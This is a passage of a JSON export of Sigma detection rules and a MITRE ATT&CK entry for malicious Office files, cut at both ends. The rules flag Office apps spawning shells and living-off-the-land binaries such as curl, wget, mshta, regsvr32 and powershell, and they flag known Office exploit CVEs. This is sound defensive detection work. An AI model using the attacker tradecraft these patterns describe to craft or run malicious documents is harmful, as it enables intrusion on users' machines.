                            "raw": "author: Antonlovesdnb\ndate: 2020/02/19\ndescription: Detects any assembly DLL being loaded by an Office Product\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|startswith: C:\\Windows\\assembly\\\n    Image|endswith:\n    - \\winword.exe\n    - \\powerpnt.exe\n    - \\excel.exe\n    - \\outlook.exe\nfalsepositives:\n- Alerts on legitimate macro usage as well, will need to filter as appropriate\nid: ff0f2b05-09db-4095-b96d-1b75ca24894a\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: dotNET DLL Loaded Via Office Applications\n",
                            "sigma:id": "ff0f2b05-09db-4095-b96d-1b75ca24894a",
                            "title": "dotNET DLL Loaded Via Office Applications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7bdde3bf-2a42-4c39-aa31-a92b3e17afac",
                        "lookup_data": {
                            "description": "Detects the process injection of a LittleCorporal generated Maldoc.",
                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/09\ndescription: Detects the process injection of a LittleCorporal generated Maldoc.\ndetection:\n  condition: selection\n  selection:\n    CallTrace|contains|all:\n    - :\\Windows\\Microsoft.NET\\Framework64\\v2.\n    - UNKNOWN\n    SourceImage|endswith: \\winword.exe\nfalsepositives:\n- Unknown\nid: 7bdde3bf-2a42-4c39-aa31-a92b3e17afac\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/06/02\nreferences:\n- https://github.com/connormcgarr/LittleCorporal\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1204.002\n- attack.t1055.003\ntitle: LittleCorporal Generated Maldoc Injection\n",
                            "sigma:id": "7bdde3bf-2a42-4c39-aa31-a92b3e17afac",
                            "title": "LittleCorporal Generated Maldoc Injection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "69483748-1525-4a6c-95ca-90dc8d431b68",
                        "lookup_data": {
                            "description": "Detects suspicious child processes spawning from microsoft office suite applications such as word or excel. This could indicates malicious macro execution",
                            "raw": "author: Sohan G (D4rkCiph3r)\ndate: 2023/01/31\ndescription: Detects suspicious child processes spawning from microsoft office suite\n  applications such as word or excel. This could indicates malicious macro execution\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - /bash\n    - /curl\n    - /dash\n    - /fish\n    - /osacompile\n    - /osascript\n    - /sh\n    - /zsh\n    - /python\n    - /python3\n    - /wget\n    ParentImage|contains:\n    - Microsoft Word\n    - Microsoft Excel\n    - Microsoft PowerPoint\n    - Microsoft OneNote\nfalsepositives:\n- Unknown\nid: 69483748-1525-4a6c-95ca-90dc8d431b68\nlevel: high\nlogsource:\n  category: process_creation\n  product: macos\nreferences:\n- https://redcanary.com/blog/applescript/\n- https://objective-see.org/blog/blog_0x4B.html\nstatus: experimental\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1059.002\n- attack.t1137.002\n- attack.t1204.002\ntitle: Suspicious Microsoft Office Child Process\n",
                            "sigma:id": "69483748-1525-4a6c-95ca-90dc8d431b68",
                            "title": "Suspicious Microsoft Office Child Process",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "23daeb52-e6eb-493c-8607-c4f0246cb7d8",
                        "lookup_data": {
                            "description": "This rule will monitor any office apps that spins up a new LOLBin process. This activity is pretty suspicious and should be investigated.",
                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Michael Haag, Christopher Peacock\n  @securepeacock (Update), SCYTHE @scythe_io (Update)\ndate: 2021/08/23\ndescription: This rule will monitor any office apps that spins up a new LOLBin process.\n  This activity is pretty suspicious and should be investigated.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\regsvr32.exe\n    - \\rundll32.exe\n    - \\msiexec.exe\n    - \\mshta.exe\n    - \\verclsid.exe\n    - \\msdt.exe\n    - \\control.exe\n    - \\msidb.exe\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n    - \\msaccess.exe\n    - \\mspub.exe\n    - \\eqnedt32.exe\n    - \\visio.exe\n    - \\wordpad.exe\n    - \\wordview.exe\nfalsepositives:\n- Unknown\nid: 23daeb52-e6eb-493c-8607-c4f0246cb7d8\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/03\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\n- https://github.com/splunk/security_content/blob/develop/detections/endpoint/office_spawning_control.yml\n- https://twitter.com/andythevariable/status/1576953781581144064?s=20&t=QiJILvK4ZiBdR8RJe24u-A\n- https://www.elastic.co/security-labs/exploring-the-ref2731-intrusion-set\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: New Lolbin Process by Office Applications\n",
                            "sigma:id": "23daeb52-e6eb-493c-8607-c4f0246cb7d8",
                            "title": "New Lolbin Process by Office Applications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "232b7f21-adf9-4b42-b936-b9d6f7df856e",
                        "lookup_data": {
                            "mitre-attack-id": "T1204.002",
                            "mitre-cti:description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                            "mitre-cti:name": "Malicious File",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['TruKno'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e', 'created': '2020-03-11T14:49:36.954Z', 'x_mitre_version': '1.2', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1204.002', 'url': 'https://attack.mitre.org/techniques/T1204/002'}, {'source_name': 'Password Protected Word Docs', 'url': 'https://www.bleepingcomputer.com/news/security/psa-dont-open-spam-containing-password-protected-word-docs/', 'description': \"Lawrence Abrams. (2017, July 12). PSA: Don't Open SPAM Containing Password Protected Word Docs. Retrieved January 5, 2022.\"}], 'x_mitre_deprecated': False, 'revoked': False, 'description': \"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\\n\\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \\n\\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\", 'modified': '2022-05-20T17:19:50.801Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Malicious File', 'x_mitre_detection': \"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\\n\\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Process: Process Creation', 'File: File Creation'], 'x_mitre_remote_support': False, 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "518643ba-7d9c-4fa5-9f37-baed36059f6a",
                        "lookup_data": {
                            "description": "Initial execution of malicious document calls wmic to execute the file with regsvr32",
                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\ndate: 2021/08/23\ndescription: Initial execution of malicious document calls wmic to execute the file\n  with regsvr32\ndetection:\n  condition: all of selection_*\n  selection_img:\n  - Image|endswith: \\wbem\\WMIC.exe\n  - OriginalFileName: wmic.exe\n  selection_parent:\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\nfalsepositives:\n- Unknown\nid: 518643ba-7d9c-4fa5-9f37-baed36059f6a\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\nrelated:\n- id: e1693bc8-7168-4eab-8718-cdcaa68a1738\n  type: derived\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: WMI Execution Via Office Process\n",
                            "sigma:id": "518643ba-7d9c-4fa5-9f37-baed36059f6a",
                            "title": "WMI Execution Via Office Process",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e6ce8457-68b1-485b-9bdd-3c2b5d679aa9",
                        "lookup_data": {
                            "description": "Detects VB DLL's loaded by an office application. Which could indicate the presence of VBA Macros.",
                            "raw": "author: Antonlovesdnb\ndate: 2020/02/19\ndescription: Detects VB DLL's loaded by an office application. Which could indicate\n  the presence of VBA Macros.\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|endswith:\n    - \\VBE7.DLL\n    - \\VBEUI.DLL\n    - \\VBE7INTL.DLL\n    Image|endswith:\n    - \\winword.exe\n    - \\powerpnt.exe\n    - \\excel.exe\n    - \\outlook.exe\nfalsepositives:\n- Alerts on legitimate macro usage as well, will need to filter as appropriate\nid: e6ce8457-68b1-485b-9bdd-3c2b5d679aa9\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2023/01/06\nreferences:\n- https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: VBA DLL Loaded Via Office Application\n",
                            "sigma:id": "e6ce8457-68b1-485b-9bdd-3c2b5d679aa9",
                            "title": "VBA DLL Loaded Via Office Application",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aa3a6f94-890e-4e22-b634-ffdfd54792cc",
                        "lookup_data": {
                            "description": "Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio",
                            "raw": "author: Jason Lynch\ndate: 2019/04/02\ndescription: Detects an executable in the users directory started from Microsoft Word,\n  Excel, Powerpoint, Publisher or Visio\ndetection:\n  condition: selection and not filter\n  filter:\n    Image|endswith: \\Teams.exe\n  selection:\n    Image|endswith: .exe\n    Image|startswith: C:\\users\\\n    ParentImage|endswith:\n    - \\WINWORD.EXE\n    - \\EXCEL.EXE\n    - \\POWERPNT.exe\n    - \\MSPUB.exe\n    - \\VISIO.exe\n    - \\MSACCESS.exe\n    - \\EQNEDT32.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: aa3a6f94-890e-4e22-b634-ffdfd54792cc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/02\nreferences:\n- sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c\n- https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1204.002\n- attack.g0046\n- car.2013-05-002\ntitle: MS Office Product Spawning Exe in User Dir\n",
                            "sigma:id": "aa3a6f94-890e-4e22-b634-ffdfd54792cc",
                            "title": "MS Office Product Spawning Exe in User Dir",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "864403a1-36c9-40a2-a982-4c9a45f7d833",
                        "lookup_data": {
                            "description": "Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/02/22\ndescription: Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits\n  for CVE-2017-0261 and CVE-2017-0262\ndetection:\n  condition: selection\n  selection:\n    Image|contains: \\FLTLDR.exe\n    ParentImage|endswith: \\WINWORD.EXE\nfalsepositives:\n- Several false positives identified, check for suspicious file names or locations\n  (e.g. Temp folders)\nid: 864403a1-36c9-40a2-a982-4c9a45f7d833\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1203\n- attack.t1204.002\n- attack.initial_access\n- attack.t1566.001\ntitle: Exploit for CVE-2017-0261\n",
                            "sigma:id": "864403a1-36c9-40a2-a982-4c9a45f7d833",
                            "title": "Exploit for CVE-2017-0261",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d8c0c469-2d3e-437a-80a1-a38bfe5998e8",
                        "lookup_data": {
                            "description": "IndigoZebra APT continues to attack Central Asia with evolving tools",
                            "link": "http://www.botvrij.eu/data/feed-osint/d8c0c469-2d3e-437a-80a1-a38bfe5998e8.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1625229668",
                            "uuid": "d8c0c469-2d3e-437a-80a1-a38bfe5998e8",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "90217a70-13fc-48e4-b3db-0d836c5824ac",
                        "lookup_data": {
                            "description": "Detects any GAC DLL being loaded by an Office Product",
                            "raw": "author: Antonlovesdnb\ndate: 2020/02/19\ndescription: Detects any GAC DLL being loaded by an Office Product\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|startswith: C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\n    Image|endswith:\n    - \\winword.exe\n    - \\powerpnt.exe\n    - \\excel.exe\n    - \\outlook.exe\nfalsepositives:\n- Alerts on legitimate macro usage as well, will need to filter as appropriate\nid: 90217a70-13fc-48e4-b3db-0d836c5824ac\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: GAC DLL Loaded Via Office Applications\n",
                            "sigma:id": "90217a70-13fc-48e4-b3db-0d836c5824ac",
                            "title": "GAC DLL Loaded Via Office Applications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "00d0b5ab-1f55-4120-8e83-487c0a7baf19",
                        "lookup_data": {
                            "description": "Detects download of certain file types from hosts in suspicious TLDs",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/11/07\ndescription: Detects download of certain file types from hosts in suspicious TLDs\ndetection:\n  condition: selection\n  selection:\n    c-uri-extension:\n    - exe\n    - vbs\n    - bat\n    - rar\n    - ps1\n    - doc\n    - docm\n    - xls\n    - xlsm\n    - pptm\n    - rtf\n    - hta\n    - dll\n    - ws\n    - wsf\n    - sct\n    - zip\n    r-dns|endswith:\n    - .country\n    - .stream\n    - .gdn\n    - .mom\n    - .xin\n    - .kim\n    - .men\n    - .loan\n    - .download\n    - .racing\n    - .online\n    - .science\n    - .ren\n    - .gb\n    - .win\n    - .top\n    - .review\n    - .vip\n    - .party\n    - .tech\n    - .xyz\n    - .date\n    - .faith\n    - .zip\n    - .cricket\n    - .space\n    - .info\n    - .vn\n    - .cm\n    - .am\n    - .cc\n    - .asia\n    - .ws\n    - .tk\n    - .biz\n    - .su\n    - .st\n    - .ro\n    - .ge\n    - .ms\n    - .pk\n    - .nu\n    - .me\n    - .ph\n    - .to\n    - .tt\n    - .name\n    - .tv\n    - .kz\n    - .tc\n    - .mobi\n    - .study\n    - .click\n    - .link\n    - .trade\n    - .accountant\n    - .cf\n    - .gq\n    - .ml\n    - .ga\n    - .pw\nfalsepositives:\n- All kinds of software downloads\nfields:\n- ClientIP\n- c-uri\nid: 00d0b5ab-1f55-4120-8e83-487c0a7baf19\nlevel: low\nlogsource:\n  category: proxy\nmodified: 2023/01/09\nreferences:\n- https://www.symantec.com/connect/blogs/shady-tld-research-gdn-and-our-2016-wrap\n- https://promos.mcafee.com/en-US/PDF/MTMW_Report.pdf\n- https://www.spamhaus.org/statistics/tlds/\n- https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/\nrelated:\n- id: b5de2919-b74a-4805-91a7-5049accbaefe\n  type: similar\nstatus: test\ntags:\n- attack.initial_access\n- attack.t1566\n- attack.execution\n- attack.t1203\n- attack.t1204.002\ntitle: Download From Suspicious TLD - Blacklist\n",
                            "sigma:id": "00d0b5ab-1f55-4120-8e83-487c0a7baf19",
                            "title": "Download From Suspicious TLD - Blacklist",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a2a3b925-7bb0-433b-b508-db9003263cc4",
                        "lookup_data": {
                            "description": "Detects DSParse DLL being loaded by an Office Product",
                            "raw": "author: Antonlovesdnb\ndate: 2020/02/19\ndescription: Detects DSParse DLL being loaded by an Office Product\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|contains: \\dsparse.dll\n    Image|endswith:\n    - \\winword.exe\n    - \\powerpnt.exe\n    - \\excel.exe\n    - \\outlook.exe\nfalsepositives:\n- Alerts on legitimate macro usage as well, will need to filter as appropriate\nid: a2a3b925-7bb0-433b-b508-db9003263cc4\nlevel: high\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: Active Directory Parsing DLL Loaded Via Office Applications\n",
                            "sigma:id": "a2a3b925-7bb0-433b-b508-db9003263cc4",
                            "title": "Active Directory Parsing DLL Loaded Via Office Applications",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "678eb5f4-8597-4be6-8be7-905e4234b53a",
                        "lookup_data": {
                            "description": "Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/11/23\ndescription: Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other\n  sub processes like mshta.exe\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\EQNEDT32.EXE\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: 678eb5f4-8597-4be6-8be7-905e4234b53a\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.hybrid-analysis.com/sample/2a4ae284c76f868fc51d3bb65da8caa6efacb707f265b25c30f34250b76b7507?environmentId=100\n- https://www.google.com/url?hl=en&q=https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about&source=gmail&ust=1511481120837000&usg=AFQjCNGdL7gVwLXaNSl2Td8ylDYbSJFmPw\nstatus: stable\ntags:\n- attack.execution\n- attack.t1203\n- attack.t1204.002\n- attack.initial_access\n- attack.t1566.001\ntitle: Droppers Exploiting CVE-2017-11882\n",
                            "sigma:id": "678eb5f4-8597-4be6-8be7-905e4234b53a",
                            "title": "Droppers Exploiting CVE-2017-11882",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "60936b49-fca0-4f32-993d-7415edcf9a5d",
                        "lookup_data": {
                            "description": "A General detection for a new application in AppCompat. This indicates an application executing for the first time on an endpoint.",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: A General detection for a new application in AppCompat. This indicates\n  an application executing for the first time on an endpoint.\ndetection:\n  condition: selection\n  selection:\n    EventType: Setvalue\n    TargetObject|contains: \\AppCompatFlags\\Compatibility Assistant\\Store\\\nfalsepositives:\n- This rule is to explore new applications on an endpoint. False positives depends\n  on the organization.\n- Newly setup system.\n- Legitimate installation of new application.\nid: 60936b49-fca0-4f32-993d-7415edcf9a5d\nlevel: informational\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/06/26\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/1\n- https://threathunterplaybook.com/evals/apt29/detections/1.A.1_DFD6A782-9BDB-4550-AB6B-525E825B095E.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: New Application in AppCompat\n",
                            "sigma:id": "60936b49-fca0-4f32-993d-7415edcf9a5d",
                            "title": "New Application in AppCompat",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4922a5dd-6743-4fc2-8e81-144374280997",
                        "lookup_data": {
                            "description": "Detects a flashplayer update from an unofficial location",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/10/25\ndescription: Detects a flashplayer update from an unofficial location\ndetection:\n  condition: selection and not filter\n  filter:\n    cs-host|endswith: .adobe.com\n  selection:\n  - c-uri|contains: /flash_install.php\n  - c-uri|endswith: /install_flash_player.exe\nfalsepositives:\n- Unknown flash download locations\nid: 4922a5dd-6743-4fc2-8e81-144374280997\nlevel: high\nlogsource:\n  category: proxy\nmodified: 2022/08/08\nreferences:\n- https://gist.github.com/roycewilliams/a723aaf8a6ac3ba4f817847610935cfb\nstatus: test\ntags:\n- attack.initial_access\n- attack.t1189\n- attack.execution\n- attack.t1204.002\n- attack.defense_evasion\n- attack.t1036.005\ntitle: Flash Player Update from Suspicious Location\n",
                            "sigma:id": "4922a5dd-6743-4fc2-8e81-144374280997",
                            "title": "Flash Player Update from Suspicious Location",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74",
                        "lookup_data": {
                            "description": "Unmasking MirrorFace: Operation LiberalFace targeting Japanese political entities | WeLiveSecurity",
                            "link": "http://www.botvrij.eu/data/feed-osint/7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1671610618",
                            "uuid": "7a4afb4a-3eb1-4966-9c25-7e1ce2b1eb74",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "208748f7-881d-47ac-a29c-07ea84bf691d",
                        "lookup_data": {
                            "description": "Detects a Windows command and scripting interpreter executable started from Microsoft Outlook",
                            "raw": "author: Michael Haag, Florian Roth (Nextron Systems), Markus Neis, Elastic, FPT.EagleEye\n  Team\ndate: 2022/02/28\ndescription: Detects a Windows command and scripting interpreter executable started\n  from Microsoft Outlook\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\sh.exe\n    - \\bash.exe\n    - \\scrcons.exe\n    - \\schtasks.exe\n    - \\regsvr32.exe\n    - \\hh.exe\n    - \\wmic.exe\n    - \\mshta.exe\n    - \\msiexec.exe\n    - \\forfiles.exe\n    - \\scriptrunner.exe\n    - \\mftrace.exe\n    - \\AppVLP.exe\n    - \\svchost.exe\n    - \\msbuild.exe\n    - \\msdt.exe\n    ParentImage|endswith: \\OUTLOOK.EXE\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 208748f7-881d-47ac-a29c-07ea84bf691d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/31\nreferences:\n- https://www.hybrid-analysis.com/sample/465aabe132ccb949e75b8ab9c5bda36d80cf2fd503d52b8bad54e295f28bbc21?environmentId=100\n- https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nrelated:\n- id: 438025f9-5856-4663-83f7-52f878a70a50\n  type: derived\nstatus: test\ntags:\n- attack.execution\n- attack.t1204.002\ntitle: Microsoft Outlook Product Spawning Windows Shell\n",
                            "sigma:id": "208748f7-881d-47ac-a29c-07ea84bf691d",
                            "title": "Microsoft Outlook Product Spawning Windows Shell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                        "lookup_data": {
                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1674763285",
                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fdd84c68-a1f6-47c9-9477-920584f94905",
                        "lookup_data": {
                            "description": "Detects Winword starting uncommon sub process csc.exe as used in exploits for CVE-2017-8759",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/09/15\ndescription: Detects Winword starting uncommon sub process csc.exe as used in exploits\n  for CVE-2017-8759\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\csc.exe\n    ParentImage|endswith: \\WINWORD.EXE\nfalsepositives:\n- Unknown\nid: fdd84c68-a1f6-47c9-9477-920584f94905\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.hybrid-analysis.com/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100\n- https://www.reverse.it/sample/0b4ef455e385b750d9f90749f1467eaf00e46e8d6c2885c260e1b78211a51684?environmentId=100\nstatus: test\ntags:\n- attack.execution\n- attack.t1203\n- attack.t1204.002\n- attack.initial_access\n- attack.t1566.001\ntitle: Exploit for CVE-2017-8759\n",
                            "sigma:id": "fdd84c68-a1f6-47c9-9477-920584f94905",
                            "title": "Exploit for CVE-2017-8759",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
                        "lookup_data": {
                            "description": "Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin).",
                            "raw": "author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)\ndate: 2021/08/23\ndescription: Office application called wmic to proxye execution through a LOLBIN process.\n  This is often used to break suspicious parent-child chain (Office app spawns LOLBin).\ndetection:\n  condition: all of selection_*\n  selection_parent:\n    CommandLine|contains:\n    - regsvr32\n    - rundll32\n    - msiexec\n    - mshta\n    - verclsid\n    CommandLine|contains|all:\n    - process\n    - create\n    - call\n    ParentImage|endswith:\n    - \\winword.exe\n    - \\excel.exe\n    - \\powerpnt.exe\n  selection_wmic:\n  - Image|endswith: \\wbem\\WMIC.exe\n  - OriginalFileName: wmic.exe\nfalsepositives:\n- Unknown\nid: e1693bc8-7168-4eab-8718-cdcaa68a1738\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n- https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml\nrelated:\n- id: 518643ba-7d9c-4fa5-9f37-baed36059f6a\n  type: derived\n- id: 9d1c72f5-43f0-4da5-9320-648cf2099dd0\n  type: obsoletes\n- id: c0e1c3d5-4381-4f18-8145-2583f06a1fe5\n  type: obsoletes\nstatus: experimental\ntags:\n- attack.t1204.002\n- attack.t1047\n- attack.t1218.010\n- attack.execution\n- attack.defense_evasion\ntitle: Suspicious WMI Execution Via Office Process\n",
                            "sigma:id": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
                            "title": "Suspicious WMI Execution Via Office Process",
